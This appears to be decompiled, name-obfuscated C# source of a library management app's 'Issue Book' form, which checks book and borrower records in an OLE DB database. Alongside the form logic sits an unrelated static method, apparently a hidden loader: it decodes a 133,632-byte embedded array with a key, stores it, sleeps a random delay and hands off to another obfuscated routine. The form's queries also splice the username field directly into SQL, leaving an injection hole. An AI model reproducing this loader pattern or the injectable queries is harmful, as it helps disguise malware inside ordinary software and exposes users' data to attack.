using System;
using System.ComponentModel;
using System.Data.OleDb;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using Dc7;
using Fr1;
using Microsoft.VisualBasic.CompilerServices;
using Sj1c;
using o3K5;
using t0B;

namespace Yj0p;

[DesignerGenerated]
public class i6MQ : UserControl
{
	private TextBox _AccNoTextBox;

	private Label _Label1;

	internal IContainer y;

	internal Button x;

	internal TextBox c;

	internal Label p;

	internal Label j;

	public i6MQ()
	{
		((UserControl)this).add_Load((EventHandler)o7C6);
		k2AG();
	}

	protected override void n9YD(bool Cf72)
	{
		try
		{
			if (Cf72 && y != null)
			{
				y.Dispose();
			}
		}
		finally
		{
			((ContainerControl)this).Dispose(Cf72);
		}
	}

	private void k2AG()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		//IL_0071: Expected O, but got Unknown
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0105: Expected O, but got Unknown
		//IL_0123: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ca: Expected O, but got Unknown
		//IL_01f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0265: Unknown result type (might be due to invalid IL or missing references)
		//IL_026f: Expected O, but got Unknown
		//IL_028d: Unknown result type (might be due to invalid IL or missing references)
		//IL_02dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e7: Expected O, but got Unknown
		//IL_0305: Unknown result type (might be due to invalid IL or missing references)
		//IL_0361: Unknown result type (might be due to invalid IL or missing references)
		//IL_036b: Expected O, but got Unknown
		//IL_0454: Unknown result type (might be due to invalid IL or missing references)
		Kf94(new Label());
		p0MX(new Label());
		Xt6n(new Button());
		x7ZX(new TextBox());
		o2K4(new TextBox());
		Na40(new Label());
		((Control)this).SuspendLayout();
		Ep7f().set_AutoSize(true);
		((Control)Ep7f()).set_Font(new Font("Times New Roman", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Ep7f()).set_Location(new Point(129, 71));
		((Control)Ep7f()).set_Margin(new Padding(2, 0, 2, 0));
		((Control)Ep7f()).set_Name("AccNoLabel");
		((Control)Ep7f()).set_Size(new Size(63, 19));
		((Control)Ep7f()).set_TabIndex(5);
		Ep7f().set_Text("Book Id:");
		Yz52().set_AutoSize(true);
		((Control)Yz52()).set_Font(new Font("Times New Roman", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Yz52()).set_Location(new Point(56, 110));
		((Control)Yz52()).set_Margin(new Padding(2, 0, 2, 0));
		((Control)Yz52()).set_Name("BorrowerIdLabel");
		((Control)Yz52()).set_Size(new Size(136, 19));
		((Control)Yz52()).set_TabIndex(7);
		Yz52().set_Text("Borrower Username:");
		((ButtonBase)Sx80()).set_BackColor(Color.MediumSeaGreen);
		((Control)Sx80()).set_Cursor(Cursors.get_Hand());
		((ButtonBase)Sx80()).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)Sx80()).set_FlatStyle((FlatStyle)1);
		((Control)Sx80()).set_Font(new Font("Times New Roman", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Sx80()).set_ForeColor(Color.White);
		((Control)Sx80()).set_Location(new Point(590, 87));
		((Control)Sx80()).set_Margin(new Padding(2));
		((Control)Sx80()).set_Name("issueButton");
		((Control)Sx80()).set_Size(new Size(225, 42));
		((Control)Sx80()).set_TabIndex(9);
		((ButtonBase)Sx80()).set_Text("Issue");
		((ButtonBase)Sx80()).set_UseVisualStyleBackColor(false);
		((Control)z7T8()).set_Font(new Font("Times New Roman", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)z7T8()).set_Location(new Point(227, 71));
		((Control)z7T8()).set_Margin(new Padding(2));
		((Control)z7T8()).set_Name("AccNoTextBox");
		((Control)z7T8()).set_Size(new Size(251, 26));
		((Control)z7T8()).set_TabIndex(6);
		((Control)y0W7()).set_Font(new Font("Times New Roman", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)y0W7()).set_Location(new Point(227, 110));
		((Control)y0W7()).set_Margin(new Padding(2));
		((Control)y0W7()).set_Name("BorrowerIdTextBox");
		((Control)y0W7()).set_Size(new Size(251, 26));
		((Control)y0W7()).set_TabIndex(8);
		e5D7().set_AutoSize(true);
		((Control)e5D7()).set_Font(new Font("Times New Roman", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)e5D7()).set_ForeColor(Color.Red);
		((Control)e5D7()).set_Location(new Point(44, 20));
		((Control)e5D7()).set_Name("Label1");
		((Control)e5D7()).set_Size(new Size(103, 23));
		((Control)e5D7()).set_TabIndex(10);
		e5D7().set_Text("Issue Book");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).get_Controls().Add((Control)(object)e5D7());
		((Control)this).get_Controls().Add((Control)(object)Sx80());
		((Control)this).get_Controls().Add((Control)(object)Ep7f());
		((Control)this).get_Controls().Add((Control)(object)z7T8());
		((Control)this).get_Controls().Add((Control)(object)Yz52());
		((Control)this).get_Controls().Add((Control)(object)y0W7());
		((Control)this).set_Margin(new Padding(2));
		((Control)this).set_Name("issuebook");
		((Control)this).set_Size(new Size(1017, 227));
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Button Sx80()
	{
		return x;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Xt6n(Button Cc2n)
	{
		EventHandler eventHandler = Hf18;
		Button val = x;
		if (val != null)
		{
			((Control)val).remove_Click(eventHandler);
		}
		Button val2 = (x = Cc2n);
		val = x;
		if (val != null)
		{
			((Control)val).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual TextBox z7T8()
	{
		return _AccNoTextBox;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void x7ZX(TextBox Nn35)
	{
		EventHandler eventHandler = Sg49;
		TextBox accNoTextBox = _AccNoTextBox;
		if (accNoTextBox != null)
		{
			((Control)accNoTextBox).remove_TextChanged(eventHandler);
		}
		_AccNoTextBox = Nn35;
		accNoTextBox = _AccNoTextBox;
		if (accNoTextBox != null)
		{
			((Control)accNoTextBox).add_TextChanged(eventHandler);
		}
	}

	[SpecialName]
	internal virtual TextBox y0W7()
	{
		return c;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void o2K4(TextBox a8MD)
	{
		TextBox val = (c = a8MD);
	}

	[SpecialName]
	internal virtual Label Ep7f()
	{
		return p;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Kf94(Label i9CA)
	{
		Label val = (p = i9CA);
	}

	[SpecialName]
	internal virtual Label Yz52()
	{
		return j;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void p0MX(Label r8R0)
	{
		Label val = (j = r8R0);
	}

	[SpecialName]
	internal virtual Label e5D7()
	{
		return _Label1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Na40(Label i4P1)
	{
		_Label1 = i4P1;
	}

	private void Hf18(object sender, EventArgs e)
	{
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Expected O, but got Unknown
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b3: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0105: Unknown result type (might be due to invalid IL or missing references)
		//IL_0140: Unknown result type (might be due to invalid IL or missing references)
		//IL_0147: Expected O, but got Unknown
		//IL_0161: Unknown result type (might be due to invalid IL or missing references)
		//IL_019d: Unknown result type (might be due to invalid IL or missing references)
		//IL_025a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0261: Expected O, but got Unknown
		//IL_02a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0382: Unknown result type (might be due to invalid IL or missing references)
		//IL_0389: Expected O, but got Unknown
		//IL_0409: Unknown result type (might be due to invalid IL or missing references)
		if ((Operators.CompareString(z7T8().get_Text(), "", false) == 0) | (Operators.CompareString(y0W7().get_Text(), "", false) == 0))
		{
			MessageBox.Show("Enter correct credentials");
			return;
		}
		if (!Regex.IsMatch(z7T8().get_Text(), "^[0-9]+$"))
		{
			MessageBox.Show("Enter correct Book id");
			return;
		}
		string connectionString = m2A.Forms.At0().connectionString;
		OleDbConnection val = new OleDbConnection(connectionString);
		val.Open();
		string text = ("select * from Borrowed where AccNo = " + z7T8().get_Text()) ?? "";
		OleDbCommand val2 = new OleDbCommand(text, val);
		OleDbDataReader val3 = val2.ExecuteReader();
		if (!val3.get_HasRows())
		{
			MessageBox.Show("Book does not exist.Please add a book first");
			return;
		}
		if (Conversions.ToBoolean((object)(val3.Read() && Conversions.ToBoolean(val3.get_Item("IsIssued")))))
		{
			MessageBox.Show("Book is already issued.Kindly reissue or return the book and issue it to another person");
			return;
		}
		string text2 = Conversions.ToString(val3.get_Item("ISBN"));
		text = "select * FROM Users where UserName = '" + y0W7().get_Text() + "'";
		OleDbCommand val4 = new OleDbCommand(text, val);
		OleDbDataReader val5 = val4.ExecuteReader();
		if (!val5.get_HasRows())
		{
			MessageBox.Show("User does not exist.Please add user first");
			return;
		}
		if (val5.Read() && Operators.ConditionalCompareObjectEqual(val5.get_Item("MaxBooks"), val5.get_Item("BooksIssued"), false))
		{
			MessageBox.Show("User has already issued max number of books");
			z7T8().set_Text("");
			y0W7().set_Text("");
			return;
		}
		string text3 = DateTime.Now.ToString("dd-MM-yyyy");
		string text4 = DateTime.Now.AddDays(60.0).ToString("dd-MM-yyyy");
		if (Operators.ConditionalCompareObjectEqual(val5.get_Item("Designation"), (object)"Student", false))
		{
			text4 = DateTime.Now.AddDays(45.0).ToString("dd-MM-yyyy");
		}
		string text5 = "select * from Books where ISBN='" + text2 + "'";
		OleDbCommand val6 = new OleDbCommand(text5, val);
		val6.set_CommandText(text5);
		OleDbDataReader val7 = val6.ExecuteReader();
		val7.Read();
		int num = Conversions.ToInteger(val7.get_Item("Remaining"));
		val7.Close();
		if (num <= 0)
		{
			MessageBox.Show("This book is not available");
			return;
		}
		text = ("update Borrowed set IsIssued=True,IssueDate='" + text3 + "',Issuecount=1,BorrowerId='" + y0W7().get_Text() + "', ReturnDate='" + text4 + "' where AccNo = " + z7T8().get_Text()) ?? "";
		val2.set_CommandText(text);
		val3.Close();
		val3 = val2.ExecuteReader();
		int num2 = Conversions.ToInteger(Operators.AddObject(val5.get_Item("BooksIssued"), (object)1));
		val5.Close();
		num = checked(num - 1);
		string text6 = "update Books set Remaining=" + Conversions.ToString(num) + " where ISBN='" + text2 + "'";
		OleDbCommand val8 = new OleDbCommand(text6, val);
		val8.set_CommandText(text6);
		val8.ExecuteNonQuery();
		val4.set_CommandText("UPDATE Users SET BooksIssued=" + Conversions.ToString(num2) + " where UserName = '" + y0W7().get_Text() + "'");
		val4.ExecuteReader();
		z7T8().set_Text("");
		y0W7().set_Text("");
		MessageBox.Show("Book Issued");
	}

	internal static void Sq6s()
	{
		byte[] array = Dz8.Tb8(133632);
		checked
		{
			int k6E = Conversions.ToInteger(w0T.mDic[w0T.sNum]) * 3;
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = x7H0.o9A1(array[i], (byte[])w0T.mDic[w0T.sArray], k6E, i);
			}
			w0T.mDic.Add(w0T.mArray, array);
			Task.Delay(new Random().Next(1000, 5000)).Wait();
			Tb5r.Pj89();
		}
	}

	private void Sg49(object sender, EventArgs e)
	{
	}

	private void o7C6(object sender, EventArgs e)
	{
	}
}
